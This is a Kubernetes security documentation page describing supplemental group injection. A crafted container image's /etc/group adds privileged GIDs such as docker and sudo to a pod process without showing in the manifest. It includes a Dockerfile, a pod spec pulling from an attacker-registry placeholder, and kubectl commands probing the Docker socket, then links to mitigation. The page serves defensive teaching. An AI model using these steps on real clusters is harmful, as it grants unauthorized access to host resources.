---
sidebar_position: 26
title: "Container Image Supplemental Group Injection"
description: "How attackers exploit Kubernetes default group merging behavior to inject unauthorized supplemental group IDs from container images into running pod processes."
keywords: [kubernetes supplemental groups, group injection, container escape, pod security, privilege escalation, /etc/group, CKS]
tags: [attack-vector, pod-security, container-escape, privilege-escalation, CKS]
related:
  - /kubernetes-security/best-practices/cluster-setup-and-hardening/pod-security/supplemental-groups-policy/
  - /kubernetes-security/best-practices/cluster-setup-and-hardening/pod-security/pod-security-standards/
  - /kubernetes-security/attack-vectors/privileged-container-escape/
---

# Container Image Supplemental Group Injection

Kubernetes merges group memberships by default. When a pod starts, the container runtime resolves the supplemental group IDs for the container process by combining the groups explicitly specified in the pod's security context (`supplementalGroups`, `fsGroup`, `runAsGroup`) with the group memberships defined in `/etc/group` inside the container image for the container's primary user.

This implicit merge is invisible in the pod manifest. Policy engines that validate pod specifications cannot detect group IDs that originate from the image, because there is no manifest field that reflects them. A container image that includes crafted entries in its `/etc/group` file can therefore inject additional group IDs into the running container process beyond what the operator declared — including group IDs that provide access to sensitive volumes, host paths, or shared resources within the pod.

---

## Exploitation Steps

An attacker with the ability to influence the container image used by a pod crafts an image that includes privileged group memberships for its primary user.

### 1. Craft a Malicious Container Image

The attacker builds an image where the primary user (uid 1000) is a member of a privileged group — for example, GID 27 (`sudo` on many Linux systems) or GID 999 (`docker`):

```dockerfile
FROM ubuntu:24.04
RUN useradd -u 1000 appuser && \
    groupadd -g 999 docker && \
    usermod -aG docker appuser && \
    usermod -aG sudo appuser
USER appuser
```

The resulting `/etc/group` inside the image maps uid 1000 to GIDs 999 and 27 in addition to the primary group.

### 2. Deploy a Pod Using the Image

The attacker pushes this image to a registry accessible by the cluster and deploys a pod that appears to have a restricted security context:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: data-processor
  namespace: production
spec:
  securityContext:
    runAsUser: 1000
    runAsGroup: 3000
    supplementalGroups: [4000]
  containers:
  - name: processor
    image: attacker-registry.example.com/data-processor:latest
```

The pod manifest shows only `supplementalGroups: [4000]`. There is no indication in the manifest that additional groups will be applied.

### 3. Observe Injected Group IDs

When the pod runs, the container process has the full merged group list including the groups injected from the image:

```bash
kubectl exec data-processor -- id
# uid=1000 gid=3000 groups=3000,4000,27,999
```

Groups 27 and 999 were not declared in the pod spec. They come entirely from `/etc/group` in the image. Policy engines that validated the pod manifest had no visibility into these groups.

### 4. Access Group-Restricted Resources

The injected group IDs grant the container process access to any file, device, or volume that is group-accessible to GIDs 27 or 999. If a host volume is mounted that is readable by the `docker` group, the container can read it:

```bash
kubectl exec data-processor -- ls -la /var/run/docker.sock
# srw-rw---- 1 root docker 0 Mar 20 10:00 /var/run/docker.sock
kubectl exec data-processor -- cat /var/run/docker.sock
```

---

### Result

The container process gains access to group-restricted resources that the pod operator did not intend to grant. **Policy-based controls that evaluate only the pod manifest miss this attack entirely**, because the injected group IDs have no representation in the Kubernetes API. An attacker with control over the container image can silently expand the effective permissions of any pod that uses it.

---

## Mitigation

➡ [Controlling Supplemental Group IDs with SupplementalGroupsPolicy](/kubernetes-security/best-practices/cluster-setup-and-hardening/pod-security/supplemental-groups-policy/)

---

## References

This article is based on information from the following official sources:

1. [Fine-grained SupplementalGroups control for Pods (GA)](https://kubernetes.io/blog/2025/12/23/kubernetes-v1-35-fine-grained-supplementalgroups-control-ga/) - Kubernetes Blog
2. [Fine-grained SupplementalGroups control for Pods (Alpha)](https://kubernetes.io/blog/2024/08/22/fine-grained-supplementalgroups-control/) - Kubernetes Blog
3. [Configure a Security Context for a Pod or Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/) - Kubernetes Documentation
